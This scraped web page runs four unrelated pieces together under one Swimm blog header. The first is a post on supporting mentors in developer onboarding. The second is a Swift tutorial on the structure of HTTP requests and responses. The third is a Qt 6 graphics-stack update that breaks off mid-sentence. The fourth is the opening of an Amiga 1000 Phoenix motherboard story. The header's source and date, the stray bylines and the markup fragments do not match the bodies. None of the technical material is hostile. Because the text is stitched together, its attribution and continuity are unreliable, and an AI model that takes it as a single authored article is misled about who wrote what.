October 27, 2020 | https://swimm.io/blog/2020-07-14-who%E2%80%99s-mentoring-the-mentor/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/2020-07-14-who%E2%80%99s-mentoring-the-mentor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-v-61c0ab88=""> <!----> <div data-v-2ee12136="" data-v-61c0ab88=""><div><p>Anyone who has ever queried information about developer onboarding, could notice right away, what we at Swimm call ‘The Onboardee Bias’. Most onboarding approaches are centered on guiding new hires through their first days, tasks or overcoming the hurdles of getting started. But this approach rarely highlights the troubles and challenges of the mentors*. While we frequently hear about the “Sink or Swim” approach by which new engineers are “thrown into the deep end” with hands-on tasks on their first day in, the truth is, mentors are also treated this way, although unintentionally with no buoy waiting for them.</p>
<p>Mentors are, by definition, some of the more experienced and confident engineers on the team, so it’s almost counter intuitive to highlight their insecurities. Yet, our experience is that this is in-fact the core problem of engineer onboarding.** <strong>In this post we try to shed light on the role of the mentor in the onboarding process:</strong></p>
<ul>
<li>‘The Good Mentor Checklist’</li>
<li>How Poor Mentorship Reflects in Business</li>
<li>Mentoring the Mentor 101</li>
</ul>
<p><em>* By ‘mentors’ we mean experienced engineers tasked with onboarding a new hire, sometimes also called “buddies” among engineering teams.</em></p>
<p><em>** There are some awesome onboarding experiences out there. We are not saying they don’t exist. But our experience is that they are not the norm.</em></p>
<h2>1. ‘The Good Mentor Checklist’</h2>
<p>The journey to good mentorship starts with reflecting on your own experiences (as a mentor or mentee). Form a list with some of the tools and traits of a super successful mentor, and then try to map out the hurdles - why do some mentors fail to thrive? Here are some key reasons:</p>
<ul>
<li><strong>Time.</strong> Or lack of it. It’s no coincidence that most mentors are extremely busy. Knowing their way around means they get picked for harder tasks. Good mentorship requires ample time and patience, and many mentors lack those.</li>
<li><strong>Good Documentation.</strong> So much has been written and said about how challenging it is to create and maintain good documentation. Suffice to say that a mentor’s life would be much easier with it, and it rarely exists.</li>
<li><strong>Mentorship Skills.</strong> If you have been picked to be a mentor (congrats), you are likely very experienced and know your way around the company or code. But being a really good mentor means you also need an entire skill-set associated with mentorship such as leadership skills, best practices, up to date training techniques, and more.</li>
<li><strong>A Realistic Plan.</strong> While most organisations create a basic onboarding plan for the first few days on the job, this plan consists mostly of HR issues and basic orientation. Our experience shows that most teams don’t have a plan for onboarding the new hires onto the codebase, explaining common issues, legacy code, best practice or edge cases. If they do, it’s a basic checklist.</li>
<li><strong>Passion for apprenticeship</strong>. It goes without saying that a little passion for paying it forward and teaching others, goes a long way and makes all the difference between a mentor and a really good mentor. A major hurdle is identifying such spirit in mentors and leveraging it, but also making sure they don’t burn out.</li>
</ul>

<h2>2. How Poor Mentorship Reflects in Business</h2>
<p>So we have established some key elements needed for the job. We also established that many times, mentors, experienced and competent as they may be, are not properly prepared for the task.</p>
<p>How does this affect our job and business?</p>
<ul>
<li><strong>The Swiveling Chair Syndrome</strong>. Getting a task you feel unqualified for, might lead many mentors - even potentially great ones to procrastinate. Preparations for the new hire are pushed to the day before their arrival, and sometimes happen on-the-go. The result of which - talented new engineers swiveling in their chairs for quite some time, waiting for something to happen…(or in other words, stretched out time-to-value).</li>
<li><strong>System malfunctions</strong>. Another unfortunate product could be finger-pointing and blaming “the system”. Feeling embarrassed with their inadequacy, mentors might vent hints of frustration with the new hire: “Yeah, there’s some documentation, but I wouldn’t bother with it… Just try to figure it out…” or “They told me you were coming last week, but we have a version coming out, so I guess you’ll have to manage…”. Of course, these are the last things you want new hires to hear in their first few weeks.</li>
<li><strong>Sinking, not swimming</strong>. We mentioned the “sink or swim” approach earlier. Sure, letting new hires struggle with no help is a way to weed out weaker hires, and it may shorten the time it takes to spot a poor fit. But this also means you are giving the good hires a hard time, sending them to fend for themselves. This method is often used to mask insecurity. Rather than admitting you don’t know how to deal with onboarding someone, it is much easier to explain a lack of a plan with ideology. So, even if this method is not beneficial in the long run, unprepared mentors might adopt it anyway.</li>
</ul>
<h2><strong>3. Mentoring the Mentor 101</strong></h2>
<p>So, what can you do about this naturally occurring bias?</p>
<p>Like with other issues, acknowledging there is a problem (i.e. that mentors are being overlooked) is a good starting point. Ask senior developers how prepared they were or currently feel to mentor. Ask them how their own onboarding was like, and whether they would have wanted it to be different. Recall your own onboarding experiences, both as a mentor and a new hire. But mainly, focus on cultivating a culture of knowledge sharing, and creating a tier of mentors equipped with the best tools to handle their next mentoring assignment.</p>

<hr>

    <p>For a while now I’ve had a series of blog posts floating around in my head on how to build an HTTP stack in Swift. The idea started last spring with Rob Napier’s <a href="https://robnapier.net/start-with-a-protocol">blog posts on protocols</a>, and matured last summer and fall while I was working at WeWork on an internal Swift framework.</p>

<p>So, with my <a href="https://davedelong.com/blog/2020/06/14/anything-worth-doing/">newfound blogging powers</a>, I think it’s time to tackle this problem. Over the course of several posts, I’ll walk through a number of topics related to HTTP and how we can fit them together into a great Swift framework. We’ll end up with a framework that supports things like:</p>

<ul>
  <li>automatically retrying requests</li>
  <li>throttling to a customizable maximum number of concurrent requests</li>
  <li>specifying custom server environments for an entire connection stack, or for a single request</li>
  <li>automatically cancelling in-flight requests when the stack is reset</li>
  <li>basic mesh networking</li>
  <li>implementing OAuth (or any sort of authenticated request)</li>
  <li>multi-part form uploads</li>
  <li>easy mocking of responses</li>
  <li>… and a whole lot more I’m glossing over</li>
</ul>

<p>We’ll be building all of this on top of <code>URLSession</code>. And along the way, we’ll be addressing a lot of the feedback I <a href="https://davedelong.com/blog/2018/03/02/apple-networking-feedback/">provided to Apple Engineers</a> about the state of the built-in networking stack. (Awesomely, in the past 2 years a couple of those items have already been addressed)</p>

<p>I will preempt any questions by saying: I will <em>not</em> be publishing the actual code for this framework online. The purpose of these posts is to describe the problems and solutions, but implementing them will be left up to you. I will have small embedded snippets to illustrate concepts, but largely the entire thing will be left as an “exercise for the reader”. There’s just no substitute for sitting down and writing the code yourself.</p>

<p>But… before we get started in Swift, we need to answer a really fundamental question.</p>

<h2 id="what-on-earth-is-http">What on earth is HTTP?</h2>

<p>HTTP, or the <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">“Hypertext Transfer Protocol”</a>, is a specification for describing how two different systems can communicate with each other. As its name implies, it’s a <em>text</em>-based specification. This is great for humans, because text is nicely readable, and it’s good for machines, because text is pretty nicely compressible (which is a major part of the 2.0 specification).</p>

<p>HTTP defines a very specific <a href="https://en.wikipedia.org/wiki/Request%E2%80%93response">“request/response”</a> model. You send out a request for information, and you get a response back. One request, one response.</p>

<p>A request has the following format:</p>

<ol>
  <li>A request line</li>
  <li>Zero-or-more header value lines</li>
  <li>A blank line</li>
  <li>An optional body</li>
</ol>

<h3 id="request-lines">Request Lines</h3>

<p>A request line looks something like:</p>



<p>The first part of the line is the <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods">request method</a>. We’re most familiar with <code>GET</code> and <code>POST</code>, but other common HTTP methods include things like <code>HEAD</code>, <code>PUT</code>, <code>DELETE</code>, and so on. In reality, the HTTP spec itself does not place a limit on the value of the request method, which allows for specs like <a href="https://en.wikipedia.org/wiki/WebDAV">WebDAV</a> (which powers CalDAV and CardDAV) to add their own methods like <code>COPY</code>, <code>LOCK</code>, <code>PROPFIND</code>, and so on.</p>

<p>This leads us to the simplest of problems with a lot of Swift networking frameworks. It’s really common to see something like this:</p>

<div><div><pre><code><span>public</span> <span>enum</span> <span>HTTPMethod</span><span>:</span> <span>String</span> <span>{</span>
    <span>case</span> <span>get</span> <span>=</span> <span>"GET"</span>
    <span>case</span> <span>post</span> <span>=</span> <span>"POST"</span>
    <span>case</span> <span>put</span> <span>=</span> <span>"PUT"</span>
    <span>case</span> <span>delete</span> <span>=</span> <span>"DELETE"</span>
<span>}</span>
</code></pre></div></div>

<p>Since the HTTP spec allows for <em>any</em> single-word method, defining this value in Swift as an <em>enum</em> is incorrect, because an enum only allows for a finite number of values, but there are an infinite number of possible “single word” values. A <em>better</em> implementation of this is to use a <code>struct</code>:</p>

<div><div><pre><code><span>public</span> <span>struct</span> <span>HTTPMethod</span><span>:</span> <span>Hashable</span> <span>{</span>
    <span>public</span> <span>static</span> <span>let</span> <span>get</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"GET"</span><span>)</span>
    <span>public</span> <span>static</span> <span>let</span> <span>post</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"POST"</span><span>)</span>
    <span>public</span> <span>static</span> <span>let</span> <span>put</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"PUT"</span><span>)</span>
    <span>public</span> <span>static</span> <span>let</span> <span>delete</span> <span>=</span> <span>HTTPMethod</span><span>(</span><span>rawValue</span><span>:</span> <span>"DELETE"</span><span>)</span>

    <span>public</span> <span>let</span> <span>rawValue</span><span>:</span> <span>String</span>
<span>}</span>
</code></pre></div></div>

<p>After the method comes the path, which should be readily recognizable as the <code>.path</code> of a <code>URL</code>.</p>

<p>Finally, there’s a bit about which HTTP spec version you’re using. HTTP 2.0 is commonly used these days, but since it mainly deals with <em>compressed</em> HTTP requests, I’ll use the 1.1 version, which describes <em>uncompressed</em> requests.</p>



<p>Headers are a series of key-value pairs, in a familiar key-value-looking format:</p>

<div><div><pre><code>Host: swapi.dev
Connection: close
User-Agent: Paw/3.1.10 (Macintosh; OS X/10.15.5) GCDHTTPRequest
</code></pre></div></div>

<p>There are a number of <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">header fields commonly used with HTTP</a>, some of them defined by the specs, and some agreed upon by convention. Like with request methods, there’s no limit to the possible names of a header, nor much of a limit on the possible values.</p>

<h3 id="the-body">The Body</h3>

<p>Any HTTP request may include a body. Yes, even a <code>GET</code> request is allowed to include a body. However, most servers will only interpret the body of a request based on which request method is used, so it’s likely that even if you did include a body with a <code>GET</code> requests, the server would ignore it.</p>

<p>The body itself is just raw binary data. How it’s interpreted by the server depends entirely on conventions agreed upon between the server engineers and the client engineers.</p>

<h2 id="putting-a-request-together">Putting a request together</h2>

<p>If we want to execute a basic HTTP request to the <a href="https://swapi.dev/">Star Wars API</a>, we would construct an HTTP request that looks like this:</p>

<div><div><pre><code>GET /api/ HTTP/1.1
Host: swapi.dev
Connection: close
User-Agent: Paw/3.1.10 (Macintosh; OS X/10.15.5) GCDHTTPRequest

</code></pre></div></div>

<p>We can see the request line, 3 header lines, and an empty line at the end. It’s important to note that every line in an HTTP request is separated by <em>two</em> characters: <code>\r\n</code> (carriage return + line feed). This becomes more apparent when we look at the hex representation of this request (newlines inserted for readability):</p>

<div><div><pre><code>474554202F6170692F20485454502F312E310D0A 
486F73743A2073776170692E6465760D0A
436F6E6E656374696F6E3A20636C6F73650D0A 
557365722D4167656E743A205061772F332E312E313020284D6163696E746F73683B204F5320582F31302E31352E35292047434448545450526571756573740D0A
0D0A
</code></pre></div></div>

<p><code>0D</code> and <code>0A</code> are the hexadecimal representation of <code>\r</code> and <code>\n</code>, respectively. The empty line is how an HTTP server knows where the headers stop and the body begins.</p>

<blockquote>
  <p>As an aside, if you find yourself working with network APIs a lot, I <em>highly</em> recommend using Lucky Marmot’s fantastic app <a href="https://paw.cloud/">Paw</a>. It is an indispensable tool for analyzing and tweaking network calls.</p>
</blockquote>

<p>Another thing worth pointing out here is that <code>Host:</code> header. While it’s required by the spec, it doesn’t necessarily specify where the request is going. That’s because the host part of the URL is used before the request is ever sent by the <a href="https://en.wikipedia.org/wiki/Domain_Name_System">DNS resolution process</a> as part of the whole “what server am I actually connecting to” flow. The <code>Host</code> header is included for clarity while debugging, and it may be used by the server for further internal routing. For example, you could imagine a server for all of Github Pages using the <code>Host</code> header to know which set of pages you actually want.</p>

<p>So, that’s the request.</p>

<h2 id="what-about-the-response">What about the response?</h2>

<p>The response we get back is almost identical in structure to the request. It has:</p>

<ol>
  <li>The response line</li>
  <li>Zero or more header value lines</li>
  <li>An empty line</li>
  <li>An optional body</li>
</ol>

<p>So, that request to the Star Wars API will have a response that looks like this:</p>

<div><div><pre><code>HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 27 Jun 2020 19:13:53 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: close
Vary: Accept, Cookie
X-Frame-Options: SAMEORIGIN
ETag: "57e8c3fe1ac5cb74e15b96dc98767ce6"
Allow: GET, HEAD, OPTIONS

{"people":"http://swapi.dev/api/people/","planets":"http://swapi.dev/api/planets/","films":"http://swapi.dev/api/films/","species":"http://swapi.dev/api/species/","vehicles":"http://swapi.dev/api/vehicles/","starships":"http://swapi.dev/api/starships/"}
</code></pre></div></div>

<p>Like with the request, all lines are separated by <code>\r\n</code>, and the empty line is how we know where the headers stop and the body begins. The only other difference is that the first line now has an integer <a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">status code</a> and a textual description of the code’s meaning.</p>

<p>Like with request methods, there’s no real limit on the status code values and message. The HTTP spec defines many that we’re familiar with, such as <code>200</code> (OK) and <code>404</code> (Not Found), as well as the allowed range of numbers (100 … 599). But… you <em>could</em> return a <code>666 Diabolical</code> code, or <code>42 Mostly Harmless</code> code. You could even return a <code>200 👍</code> response. But please don’t. 😅</p>

<p>The body, again, is raw binary data and it’s up to the recipient to correctly interpret it. The Star Wars API body is JSON-encoded text, but a body can just as easily be the raw bytes of a <code>.jpg</code> file, or the XML bytes of an RSS feed, or the text that describes an <a href="https://en.wikipedia.org/wiki/M3U">HTTP live streaming playlist</a>.</p>

<h2 id="putting-it-together">Putting it together</h2>

<p>That’s an overview of HTTP requests and responses. This simple model describes the fundamental communications used by most of the internet. It doesn’t cover things like web sockets or push notifications, but this is used by every website and most network APIs. Knowing the details of how this works continues to be one of the most valuable and consistently useful things I know and use as a software engineer.</p>

<p>In the next post, we’ll take a look at how we move from this specification to the basic structures we’ll need for our framework.</p>

                                Monday October 26, 2020 by <a href="https://www.qt.io/blog/author/laszlo-agocs">Laszlo Agocs</a> | <a href="#commento">Comments</a>
                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last year we had a three part blog series about Qt's new approach to working with 3D graphics APIs and shading languages: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">part 1</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-2">part 2</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-3">part 3</a>. For <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-index.html">Qt Quick</a>, an early, opt-in preview of the new rendering architecture was shipped in Qt 5.14, with some improvements in Qt 5.15. With the release of Qt 6.0 upcoming, let's see what has happened since Qt 5.15. It will not be possible to cover every detail of the graphics stack improvements for Qt Quick here, let alone dive into the vast amount of Qt Quick 3D features, many of which are new or improved in Qt 6.0. Rather, the aim is just to give an overview of what can be expected from the graphics stack perspective when Qt 6.0 ships later this year.</p>
<p>Note that the documentation links refer to the Qt 6 snapshot documentation. This allows seeing the latest C++ and QML API pages, including all changed and new functions, but the content is also not final. These links may also break later on.</p>

<h2>QRhi improvements</h2>
<p>QRhi, the Qt Rendering Hardware Interface, is Qt's internal graphics abstraction when 3D APIs, such as OpenGL, Vulkan, Metal, and Direct 3D, are involved. Compared to 5.15, the main improvements in 6.0 are a lot of polishing fixes here and there, and, most importantly, a large set of performance optimizations. While benefitting Qt Quick as well, these become especially important with Qt Quick 3D when complex scenes with many renderable objects are involved.</p>
<p>With some simplifications, the main layers of the Qt 6.0 graphics stack can be visualized like this:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png" alt="rhiarch-3" width="800" srcset="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=400&amp;name=rhiarch-3.png 400w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png 800w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1200&amp;name=rhiarch-3.png 1200w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1600&amp;name=rhiarch-3.png 1600w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2000&amp;name=rhiarch-3.png 2000w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2400&amp;name=rhiarch-3.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<h2>Shader management</h2>
<p>The Qt Shader Tools module is now a selectable module in the installer. For applications this can be relevant because this is the module that provides the <em>qsb</em> command-line tool (not to be confused with <em>qbs</em>) and its associated CMake build system integration. In addition, the module is a mandatory dependency for Qt Quick 3D at the moment.</p>
<p>Qt 6 no longer uses OpenGL-compatible GLSL source snippets directly. Rather, shaders are all written in Vulkan-style GLSL, then reflected and translated to other shading languages, and finally packaged up into a serializable QShader object that can be consumed by QRhi. The shader preparation pipeline in Qt 6 is the following:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png" alt="shaderconditioning" width="1280" srcset="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=640&amp;name=shaderconditioning.png 640w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png 1280w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1920&amp;name=shaderconditioning.png 1920w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=2560&amp;name=shaderconditioning.png 2560w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3200&amp;name=shaderconditioning.png 3200w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3840&amp;name=shaderconditioning.png 3840w" sizes="(max-width: 1280px) 100vw, 1280px"></p>
<p>In QML applications using Qt Quick, whenever working with ShaderEffect, or subclassing QSGMaterialShader, the application will need to provide a baked shader pack in form of a .qsb file. These are generated by the <em>qsb</em> tool. This does not however mean that developers have to start dealing with a new tool directly: with the CMake integration one can easily list the vertex, fragment, and compute shaders in CMakeLists.txt via the qt6_add_shaders() CMake function. Invoking qsb and packing the resulting .qsb files into the Qt resource system is then taken care of by the build system.</p>
<p>See <a href="https://doc-snapshots.qt.io/qt6-dev/qtshadertools-index.html">the shadertools documentation</a> for an overview of how graphics and compute shaders are handled in Qt 6 and the details of the qsb tool and its CMake integration.</p>
<h2>Direct OpenGL is no more for Qt Quick</h2>
<p>In Qt 5.14 and 5.15, Qt Quick shipped with an optional QRhi-based rendering path that could be enabled by setting the environment variable <em>QSG_RHI</em>. This allowed painless experimenting with the new stack, while keeping the traditional, battle tested direct OpenGL code path the default.</p>
<p>In Qt 6.0 all such switches are gone. There is no way get rendering go directly to OpenGL with Qt Quick scenes. Rather, the new default is the QRhi-based rendering path of the Qt Quick scene graph. Other than the defaults changing, the ways to configure what QRhi backend, and so which graphics API to use are mostly unchanged compared to Qt 5.15. See <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph-renderer.html#rendering-via-the-qt-rendering-hardware-interface">the documentation</a> for details. One difference is better API naming: in C++ code to request, and so effectively tie the application to, a given QRhi backend (and by extension graphics API) is now done through the <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#setGraphicsApi">QQuickWindow::setGraphicsApi()</a> function, whereas in 5.15 this task used to be pushed onto an overload of setSceneGraphBackend(), leading to fairly inaccurate naming.</p>
<p>There are a number of implications, although many applications will not notice any of these. If an application uses neither shader code (ShaderEffect, QSGMaterial) nor does it perform its own rendering with OpenGL directly, there is a very high chance that it will need no migration steps at all. (at least not because of graphics)</p>
<h4>Applications using OpenGL directly</h4>
<p>What about applications that use OpenGL directly in one way or another, and are not interested in functioning with other graphics APIs? For example, applications that use <a href="https://doc-snapshots.qt.io/qt6-dev/qquickframebufferobject.html">QQuickFramebufferObject</a>, or connect to signals like <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRendering">QQuickWindow::beforeRendering()</a> to inject their own OpenGL rendering under or above the Qt Quick scene. This is when the setGraphicsApi() function mentioned above comes into play for real: if an application wishes, it can always state that it wants OpenGL (or Vulkan, or Metal, or D3D) only, and nothing else. That way it is guaranteed that Qt Quick is going to use the corresponding QRhi backend (or else it will fail to initialize), so the application can safely assume that going directly to OpenGL is safe, because Qt Quick will also end up rendering through OpenGL. Note that this does not exempt the application from having to do other type of porting steps: for example, if it in addition uses ShaderEffect or creates its own custom materials, it will still need to migrate to the new ways of handling shaders and materials.</p>
<h4>QSG* and QQuick* API changes</h4>
<p>The API changes mainly fall into 3 categories. This is not going to be an exhaustive list, but rather just a peek at some of the important changes. Detailed change lists and porting guides are expected to be available with the final Qt 6.0 release.</p>
<ul>
<li>
<div><p>Different approach to shaders and materials: <a href="https://doc-snapshots.qt.io/qt6-dev/qsgmaterialshader.html">QSGMaterialShader</a> received a full revamp (matching more or less what the now-removed QSGMaterialRhiShader used to be in 5.14 and 5.15). <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html">ShaderEffect</a> no longer allows inline shader strings. Rather, the vertexShader and fragmentShader properties are URLs, similarly to <span>Image.source</span> and others. They can refer to a local .qsb file, or a .qsb file embedded via the Qt resource system (qrc).</p></div>
</li>
<li>
<p>Removing OpenGL-specifics from QQuickWindow, QSGTexture, and elsewhere. It should come as no surprise that functions like <em>GLuint textureId()</em>, <em>createTextureFromId(GLuint textureId, ...)</em>, or <em>setRenderTarget(GLuint fboId)</em> are now gone. Adopting (wrapping) an existing OpenGL texture, Vulkan image, Metal texture, or D3D11 texture, or accessing the underlying native texture for a QSGTexture is still perfectly possible, but now is done via a different set of APIs, such as <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-qsgvulkantexture.html">QSGVulkanTexture</a> and the <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-sub-qtquick.html">other similar classes</a>, instances of which are <a href="https://doc-snapshots.qt.io/qt6-dev/qsgtexture.html?__hstc=233546881.8510e053e4fb66e1a58543a6e9886427.1603454017210.1603454017210.1603454017210.1&amp;__hssc=233546881.1.1603454017210&amp;__hsfp=1285229618#nativeInterface" rel="noopener">queryable from QSGTexure</a>.</p>
<ul>
<li>
<div><p>Integrating the application's own custom rendering with the graphics API that Qt Quick renders with is fully supported, not just for OpenGL, but also Vulkan, Metal, and D3D11. Due to their nature however, some of these APIs will need more than connecting to one single signal like beforeRendering() or afterRendering(). For example, we now also have <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRenderPassRecording">beforeRenderPassRecording()</a>. See the relevant section in the <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph.html#mixing-scene-graph-and-the-native-graphics-api">scenegraph overview docs</a> for more details and links to examples. Finally, the number of native graphics resources queryable via <a href="https://doc-snapshots.qt.io/qt6-dev/qsgrendererinterface.html">QSGRendererInterface</a> has been extended, now covering Vulkan, Metal, and Direct 3D too.</p></div>
</li>
</ul>
</li>
<li>
<p>Extending support for redirecting the Qt Quick scene into an offscreen render target. <a href="https://www.qt.io/blog/%3Ehttps://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html">QQuickRenderControl</a> and the related infrastructure has been heavily enhanced. This was done not just to enable working with graphics APIs other than OpenGL the same way as in Qt 5 (for example, to render a Qt Quick scene into a Vulkan VkImage without an on-screen window), but also to enable integration with AR/VR frameworks and APIs such as <a href="https://www.khronos.org/openxr/">OpenXR</a> (in combination with any of Vulkan, D3D11, or OpenGL). Besides the slightly changed QQuickRenderControl interface, we now have a number of helper classes that improve the configurability of a QQuickWindow: <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendertarget.html">QQuickRenderTarget</a>, <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsdevice.html">QQuickGraphicsDevice</a>, and <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsconfiguration.html">QQuickGraphicsConfiguration</a>. These are essential in scenarios where a more fine grained control is needed: integrating with APIs like OpenXR is not always straightforward when an existing rendering engine is involved, with a number of potential chicken-egg problems when it comes to the creation, initialization, and ownership of instance, device, and other graphics objects: Which Vulkan instance should Qt Quick use, or should it create a new one upon initializing the scenegraph for the first time? Which Vulkan physical device or DXGI adapter should Qt Quick pick, or just stay with the default? Which VkDevice extensions should be enabled in addition to what Qt itself needs? What 2D image/texture should rendering target, who creates that and when? The expectation is that Qt 6.0 will be well-prepared and providing the foundations for further exploring the world of AR/VR during the rest of the Qt 6.x series.</p>
</li>
</ul>
<h4>New approach to handling shader code in ShaderEffect</h4>
<p>A comprehensive example of the new approach to shader code in ShaderEffect is the Qt 6 port of the classic Qt 5 Cinematic Experience demo. <a href="https://github.com/alpqr/qt5-cinematic-experience" rel="noopener">(GitHub repo)</a> This version is ported to CMake and is fully functional with all graphics APIs, including all shader and particle effects.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png" alt="cinematic" width="702" srcset="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=351&amp;name=cinematic.png 351w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png 702w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1053&amp;name=cinematic.png 1053w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1404&amp;name=cinematic.png 1404w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1755&amp;name=cinematic.png 1755w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=2106&amp;name=cinematic.png 2106w" sizes="(max-width: 702px) 100vw, 702px"></p>
<p>Looking at the QML source code, for example the code for the <a href="https://github.com/alpqr/qt5-cinematic-experience/blob/master/content/CurtainEffect.qml" rel="noopener">curtain effect </a>shows that indeed it has all inline GLSL strings removed.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png" width="354" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=177&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 177w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 354w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=531&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 531w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=708&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 708w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=885&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 885w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=1062&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 1062w" sizes="(max-width: 354px) 100vw, 354px"></p>
<p>Instead, the vertex and fragment shaders now live as <a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener">ordinary files in the source tree</a>, not bundled with the application executable anymore.</p>
<p><a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener"><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=300&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png" width="300" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=150&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 150w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=300&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 300w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=450&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 450w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=600&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 600w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=750&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 750w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=900&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 900w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>It is now up to the build system and Qt Shader Tools to compile, reflect, and translate at build time - with the added benefit of shader compilation errors becoming proper build errors instead of …</p></span></p></div></div>

<p>&lt;/INTRO&gt;</p>
<p>The story behind this whole post is a bit lengthy but I’ll try to be brief 🙂</p>
<p>In August of 2019, I’ve received an email from MrTrinsic. Back then, I didn’t yet know what is coming lol.</p>
<p>It turned out that MrTrinsic is a great Amiga enthusiast and he’d asked me to work on his Amiga 1000 … but no on a standard A1000 but with an Amiga 1000 Phoenix motherboard!</p>
<p>Amiga 1000 Phoenix Enhanced mobo is an extremely rare motherboard replacement for Amiga 1000. Some people think there were no more than 200 units manufactured, others say it was no more than 2000. I’ve no idea either but still, it is very rare so a magic smoke is not an option lol.</p>
<p>This motherboard is an awesome hack in itself and that is why MrTrinsic refers to it as DIVA 😀</p>
<p>Let me quote an excerpt from one of emails.</p>
